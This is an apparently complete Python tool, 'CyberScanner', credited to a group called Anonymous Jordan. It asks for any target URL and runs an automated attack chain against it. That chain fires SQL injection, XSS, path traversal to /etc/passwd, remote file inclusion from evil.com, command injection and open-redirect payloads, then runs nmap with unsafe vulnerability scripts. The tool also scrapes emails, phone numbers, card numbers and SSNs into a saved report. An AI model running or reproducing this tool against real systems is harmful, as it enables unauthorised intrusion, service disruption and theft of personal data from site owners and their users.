#!/usr/bin/env python3
import os
import sys
import time
import json
import re
import socket
import nmap
import requests
import threading
from urllib.parse import urljoin, urlparse, quote, parse_qs
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama for colored output
init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL

class CyberScanner:
    def __init__(self):
        self.target = ""
        self.results = {
            "ip_info": {},
            "server_info": {},
            "hidden_pages": [],
            "admin_pages": [],
            "credentials": [],
            "sensitive_data": {
                "emails": [],
                "phone_numbers": [],
                "credit_cards": [],
                "social_security": []
            },
            "security_headers": [],
            "vulnerabilities": {
                "sqli": [],
                "xss": [],
                "lfi": [],
                "rfi": [],
                "idor": [],
                "cmd_injection": [],
                "open_redirect": [],
                "misconfigurations": [],
                "cve": []
            },
            "nmap_scan": {},
            "errors": []
        }
        self.headers = {'User-Agent': UserAgent().random}
        self.lock = threading.Lock()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        self.clear_screen()
        banner = pyfiglet.figlet_format("CyberScanner", font="slant")
        print(f"{Colors.RED}{banner}")
        print(f"{Colors.CYAN}Developed by Anonymous Jordan Team")
        print(f"{Colors.MAGENTA}Telegram: https://t.me/AnonymousJordan\n")
        print(f"{Colors.GREEN}{'='*50}\n")

    def show_menu(self):
        self.show_banner()
        print(f"{Colors.YELLOW}[01] {Colors.WHITE}Full Cyber Scan")
        print(f"{Colors.RED}[99] {Colors.WHITE}Exit Tool")
        print(f"\n{Colors.CYAN}Select option: ", end="")
        sys.stdout.flush()

    def normalize_url(self, url):
        if not url:
            return ""
        return url if url.startswith(('http', 'https')) else f"http://{url}"

    def get_ip_info(self):
        domain = urlparse(self.target).netloc
        try:
            ip = socket.gethostbyname(domain)
            try:
                reverse_dns = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                reverse_dns = "N/A"
                
            self.results['ip_info'] = {
                'domain': domain,
                'ip_address': ip,
                'reverse_dns': reverse_dns
            }
        except Exception as e:
            self.log_error(f"IP Lookup Error: {str(e)}")

    def check_server_info(self):
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            server_headers = {
                'Server': resp.headers.get('Server', 'Not disclosed'),
                'X-Powered-By': resp.headers.get('X-Powered-By', 'Not disclosed'),
                'X-AspNet-Version': resp.headers.get('X-AspNet-Version', 'Not disclosed')
            }
            self.results['server_info'] = server_headers
        except Exception as e:
            self.log_error(f"Server Check Error: {str(e)}")

    def check_hidden_pages(self):
        common_paths = [
            'admin', 'login', 'wp-admin', 'administrator', 'admin.php',
            'backup', 'config', 'robots.txt', 'phpmyadmin', 'test',
            'dev', 'old', '.git', '.svn', 'web.config', 'sitemap.xml',
            'README.md', 'LICENSE', 'CHANGELOG', 'db.php', 'database.php'
        ]

        def check_path(path):
            url = urljoin(self.target, path)
            try:
                resp = requests.get(url, headers=self.headers, timeout=5)
                if resp.status_code in (200, 403):
                    with self.lock:
                        self.results['hidden_pages'].append({
                            'url': url,
                            'status_code': resp.status_code,
                            'content_length': len(resp.content)
                        })
                        if "admin" in path.lower():
                            self.results['admin_pages'].append(url)
            except Exception as e:
                self.log_error(f"Hidden Page Check Error ({url}): {str(e)}")

        threads = []
        for path in common_paths:
            t = threading.Thread(target=check_path, args=(path,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()

    def check_credentials_exposure(self):
        sensitive_keywords = [
            'password', 'passwd', 'api_key', 'secret', 'db_password',
            'access_key', 'secret_key', 'username', 'user_pass'
        ]
        
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            content = resp.text.lower()
            
            found_credentials = []
            for keyword in sensitive_keywords:
                if keyword in content:
                    found_credentials.append(keyword)
            
            if found_credentials:
                self.results['credentials'].append({
                    'url': self.target,
                    'keywords_found': found_credentials,
                    'severity': 'Critical'
                })
        except Exception as e:
            self.log_error(f"Credentials Check Error: {str(e)}")

    def check_sensitive_data(self):
        patterns = {
            'emails': r'\b[\w.-]+@[\w.-]+\.\w+\b',
            'phone_numbers': r'(\+\d{1,3}\s?)?(\(\d{1,4}\)|\d{1,4})[\s.-]?\d{1,4}[\s.-]?\d{1,9}',
            'credit_cards': r'\b(?:\d[ -]*?){13,16}\b',
            'social_security': r'\b\d{3}-\d{2}-\d{4}\b'
        }
        
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            content = resp.text
            
            for data_type, pattern in patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    self.results['sensitive_data'][data_type].extend(matches)
        except Exception as e:
            self.log_error(f"Sensitive Data Check Error: {str(e)}")

    def check_security_headers(self):
        required_headers = [
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security'
        ]
        
        try:
            resp = requests.get(self.target, headers=self.headers, timeout=10)
            missing = [h for h in required_headers if h not in resp.headers]
            self.results['security_headers'] = {
                'missing_headers': missing,
                'severity': 'High' if missing else 'None'
            }
        except Exception as e:
            self.log_error(f"Security Headers Check Error: {str(e)}")

    def run_nmap_scan(self):
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=urlparse(self.target).netloc, 
                    arguments='-sV -O -T4 --script=vuln --script-args=unsafe=1')
            self.results['nmap_scan'] = nm.scaninfo()
        except Exception as e:
            self.log_error(f"Nmap Error: {str(e)}")

    def check_sqli(self):
        sqli_payloads = [
            "' OR 1=1--",
            "' UNION SELECT null, version()--",
            "admin'--",
            "' OR '1'='1"
        ]
        parsed_url = urlparse(self.target)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in sqli_payloads:
                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(test_url, headers=self.headers, timeout=10)
                    if "SQL syntax" in resp.text or "error in your SQL" in resp.text:
                        self.results['vulnerabilities']['sqli'].append({
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except Exception as e:
                    self.log_error(f"SQLi Check Error ({test_url}): {str(e)}")

    def check_xss(self):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert('XSS')>"
        ]
        parsed_url = urlparse(self.target)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in xss_payloads:
                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(test_url, headers=self.headers, timeout=10)
                    if payload in resp.text:
                        self.results['vulnerabilities']['xss'].append({
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                except Exception as e:
                    self.log_error(f"XSS Check Error ({test_url}): {str(e)}")

    def check_lfi(self):
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini"
        ]
        parsed_url = urlparse(self.target)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in lfi_payloads:
                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(test_url, headers=self.headers, timeout=10)
                    if "root:" in resp.text or "[fonts]" in resp.text:
                        self.results['vulnerabilities']['lfi'].append({
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                except Exception as e:
                    self.log_error(f"LFI Check Error ({test_url}): {str(e)}")

    def check_rfi(self):
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://malicious.site/exploit.php"
        ]
        parsed_url = urlparse(self.target)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in rfi_payloads:
                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(test_url, headers=self.headers, timeout=10)
                    if "Hacked" in resp.text or "exploit" in resp.text:
                        self.results['vulnerabilities']['rfi'].append({
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except Exception as e:
                    self.log_error(f"RFI Check Error ({test_url}): {str(e)}")

    def check_idor(self):
        try:
            # Test for Insecure Direct Object References
            parsed_url = urlparse(self.target)
            path = parsed_url.path
            if '/user/' in path:
                test_url = self.target.replace('/user/1', '/user/2')
                resp = requests.get(test_url, headers=self.headers, timeout=10)
                if resp.status_code == 200 and 'user 2' in resp.text.lower():
                    self.results['vulnerabilities']['idor'].append({
                        'url': test_url,
                        'severity': 'High'
                    })
        except Exception as e:
            self.log_error(f"IDOR Check Error: {str(e)}")

    def check_open_redirect(self):
        redirect_payloads = [
            "https://google.com",
            "https://evil.com",
            "//malicious.site"
        ]
        parsed_url = urlparse(self.target)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in redirect_payloads:
                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(test_url, headers=self.headers, timeout=10, allow_redirects=False)
                    if resp.status_code in (301, 302):
                        if payload in resp.headers.get('Location', ''):
                            self.results['vulnerabilities']['open_redirect'].append({
                                'url': test_url,
                                'payload': payload,
                                'severity': 'Medium'
                            })
                except Exception as e:
                    self.log_error(f"Open Redirect Check Error ({test_url}): {str(e)}")

    def check_cmd_injection(self):
        cmd_payloads = [
            "; ls",
            "| dir",
            "&& whoami",
            "`cat /etc/passwd`"
        ]
        parsed_url = urlparse(self.target)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in cmd_payloads:
                test_url = f"{self.target.split('?')[0]}?{param}={quote(payload)}"
                try:
                    resp = requests.get(test_url, headers=self.headers, timeout=10)
                    if "root:" in resp.text or "C:\Windows" in resp.text:
                        self.results['vulnerabilities']['cmd_injection'].append({
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except Exception as e:
                    self.log_error(f"Command Injection Check Error ({test_url}): {str(e)}")

    def check_misconfigurations(self):
        try:
            # Check for directory listing
            parsed_url = urlparse(self.target)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}/.git/"
            resp = requests.get(test_url, headers=self.headers, timeout=10)
            if "Index of /.git" in resp.text:
                self.results['vulnerabilities']['misconfigurations'].append({
                    'url': test_url,
                    'issue': 'Directory listing enabled',
                    'severity': 'Medium'
                })
        except Exception as e:
            self.log_error(f"Misconfiguration Check Error: {str(e)}")

    def check_cve_vulnerabilities(self):
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=urlparse(self.target).netloc, 
                    arguments='--script vuln --script-args=unsafe=1')
            script_results = nm._scan_result['scan']
            for host, data in script_results.items():
                if 'script' in data:
                    for script, output in data['script'].items():
                        if "CVE" in output:
                            self.results['vulnerabilities']['cve'].append({
                                'host': host,
                                'script': script,
                                'output': output,
                                'severity': 'Critical'
                            })
        except Exception as e:
            self.log_error(f"CVE Check Error: {str(e)}")

    def log_error(self, message):
        with self.lock:
            self.results['errors'].append({
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                'message': message
            })

    def generate_txt_report(self):
        report = []
        report.append("="*80)
        report.append(f"          CyberScanner Report - {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("="*80)
        report.append(f"\nTarget: {self.target}\n")

        # IP Information
        report.append("IP INFORMATION")
        report.append("--------------")
        if self.results['ip_info']:
            for key, value in self.results['ip_info'].items():
                report.append(f"{key.replace('_', ' ').title()}: {value}")
        else:
            report.append("No IP information available")

        # Server Information
        report.append("\nSERVER INFORMATION")
        report.append("------------------")
        if self.results['server_info']:
            for key, value in self.results['server_info'].items():
                report.append(f"{key.replace('_', ' ').title()}: {value}")
        else:
            report.append("No server information available")

        # Admin Pages
        report.append("\nADMIN PAGES")
        report.append("-----------")
        if self.results['admin_pages']:
            for page in self.results['admin_pages']:
                report.append(f"  - {page}")
        else:
            report.append("No admin pages found")

        # Credentials Exposure
        report.append("\nCREDENTIALS EXPOSURE")
        report.append("--------------------")
        if self.results['credentials']:
            for cred in self.results['credentials']:
                report.append(f"URL: {cred['url']}")
                report.append(f"Keywords Found: {', '.join(cred['keywords_found'])}")
                report.append(f"Severity: {cred['severity']}")
        else:
            report.append("No credentials exposed")

        # Sensitive Data
        report.append("\nSENSITIVE DATA")
        report.append("--------------")
        if any(self.results['sensitive_data'].values()):
            for data_type, data in self.results['sensitive_data'].items():
                if data:
                    report.append(f"\n{data_type.upper()} ({len(data)} findings):")
                    for item in data:
                        report.append(f"  - {item}")
        else:
            report.append("No sensitive data found")

        # Security Headers
        report.append("\nSECURITY HEADERS")
        report.append("---------------")
        if self.results['security_headers']:
            missing = self.results['security_headers']['missing_headers']
            report.append(f"Missing Headers: {', '.join(missing) if missing else 'None'}")
            report.append(f"Severity: {self.results['security_headers']['severity']}")
        else:
            report.append("Security headers check failed")

        # Hidden Pages
        report.append("\nHIDDEN PAGES")
        report.append("------------")
        if self.results['hidden_pages']:
            for page in self.results['hidden_pages']:
                report.append(f"URL: {page['url']} (Status: {page['status_code']}, Size: {page['content_length']} bytes)")
        else:
            report.append("No hidden pages found")

        # Vulnerabilities
        report.append("\nVULNERABILITIES")
        report.append("---------------")
        for vuln_type, vulns in self.results['vulnerabilities'].items():
            if vulns:
                report.append(f"\n{vuln_type.upper()} ({len(vulns)} findings):")
                for vuln in vulns:
                    report.append(f"  - URL: {vuln.get('url', 'N/A')}")
                    if 'payload' in vuln:
                        report.append(f"    Payload: {vuln['payload']}")
                    if 'issue' in vuln:
                        report.append(f"    Issue: {vuln['issue']}")
                    report.append(f"    Severity: {vuln['severity']}")
                    if 'output' in vuln:
                        report.append(f"    Output: {vuln['output'][:100]}...")

        # Nmap Scan
        report.append("\nNMAP SCAN RESULTS")
        report.append("-----------------")
        if self.results['nmap_scan']:
            for host, data in self.results['nmap_scan'].items():
                report.append(f"Host: {host}")
                report.append(f"  Scan Info: {data}")
        else:
            report.append("Nmap scan failed")

        # Errors
        report.append("\nERRORS")
        report.append("------")
        if self.results['errors']:
            for error in self.results['errors']:
                report.append(f"[{error['timestamp']}] {error['message']}")
        else:
            report.append("No errors encountered")

        report.append("\n")
        report.append("="*80)
        return "\n".join(report)

    def save_report(self, report_content):
        # Save report to Documents folder on Windows
        save_path = os.path.expanduser("~/Documents/cyberscan_report.txt")
        dir_path = os.path.dirname(save_path)
        
        if not os.path.exists(dir_path):
            try:
                os.makedirs(dir_path)
            except Exception as e:
                self.log_error(f"Directory Creation Error: {str(e)}")
                print(f"{Colors.RED}[!] Failed to create directory: {dir_path}")
                return None

        try:
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(report_content)
            return save_path
        except Exception as e:
            self.log_error(f"Report Generation Error: {str(e)}")
            return None

    def full_scan(self):
        self.show_banner()
        target = input(f"{Colors.CYAN}Enter target URL: {Colors.WHITE}").strip()
        self.target = self.normalize_url(target)
        
        if not self.target:
            print(f"{Colors.RED}[!] Invalid target URL")
            return

        print(f"\n{Colors.YELLOW}[+] Starting Full Cyber Scan on {self.target}")
        print(f"{Colors.BLUE}{'='*50}\n")
        
        scan_functions = [
            ('IP Information', self.get_ip_info),
            ('Server Information', self.check_server_info),
            ('Hidden Pages Scan', self.check_hidden_pages),
            ('Credentials Exposure Check', self.check_credentials_exposure),
            ('Sensitive Data Check', self.check_sensitive_data),
            ('Security Headers Check', self.check_security_headers),
            ('Nmap Vulnerability Scan', self.run_nmap_scan),
            ('SQL Injection Check', self.check_sqli),
            ('Cross-Site Scripting (XSS) Check', self.check_xss),
            ('Local File Inclusion (LFI) Check', self.check_lfi),
            ('Remote File Inclusion (RFI) Check', self.check_rfi),
            ('Insecure Direct Object Reference (IDOR) Check', self.check_idor),
            ('Open Redirect Check', self.check_open_redirect),
            ('Command Injection Check', self.check_cmd_injection),
            ('Security Misconfigurations Check', self.check_misconfigurations),
            ('CVE Vulnerability Check', self.check_cve_vulnerabilities)
        ]

        for desc, func in scan_functions:
            print(f"{Colors.GREEN}[+] {desc}... ", end="")
            sys.stdout.flush()
            try:
                func()
                print(f"{Colors.CYAN}Done")
            except Exception as e:
                error_msg = f"{desc} Failed: {str(e)}"
                print(f"{Colors.RED}Failed")
                self.log_error(error_msg)

        # Generate and save TXT report
        report_content = self.generate_txt_report()
        report_path = self.save_report(report_content)
        
        if report_path:
            print(f"\n{Colors.MAGENTA}[+] Scan Completed - Report saved to: {report_path}")
        else:
            print(f"\n{Colors.RED}[!] Report generation failed")

    def run(self):
        while True:
            self.show_menu()
            choice = input().strip()
            if choice == '01':
                self.full_scan()
                input("\nPress Enter to return to menu...")
            elif choice == '99':
                print(f"\n{Colors.RED}Exiting CyberScanner...")
                sys.exit(0)
            else:
                print(f"{Colors.RED}[!] Invalid option! Please choose 01 or 99")
                time.sleep(2)

if __name__ == '__main__':
    try:
        scanner = CyberScanner()
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Emergency Exit!")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Critical Error: {str(e)}")
        sys.exit(1)
